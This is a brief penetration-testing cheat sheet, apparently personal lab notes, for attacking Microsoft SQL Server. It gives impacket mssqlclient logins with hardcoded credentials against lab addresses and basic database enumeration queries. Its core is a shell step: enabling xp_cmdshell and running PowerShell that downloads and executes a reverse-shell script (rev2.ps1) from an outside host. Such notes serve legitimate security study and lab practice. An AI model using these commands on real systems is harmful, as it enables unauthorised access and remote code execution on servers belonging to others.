<https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md>

impacket-mssqlclient -db volume -windows-auth disco/"":""@10.11.1.13

mssqlclient.py RALPH/sa:poiuytrewq@10.11.1.43
mssqlclient.py RALPH/sa:poiuytrewq@10.11.1.43 -windows-auth

You can get a shell like this:
enable_xp_cmdshell
xp_cmdshell powershell iex (iwr -usebasicparsing <http://192.168.119.156/rev2.ps1>[)](http://192.168.119.156/rev2.ps1))

Some basic checks:

`SELECT name FROM master..sysdatabases;`
`USE <dbname>;`  
`SELECT table_name FROM information_schema.tables;`
`SELECT * FROM <whatever_table>;`

![unnamed_0a78de90ba154d7fad6d209f80024307](docs/Attachments/Methodology/1.%20Enumeration/Other%20Services/3306/Mssql/Mssql/{{notename}}-202605011506.png)
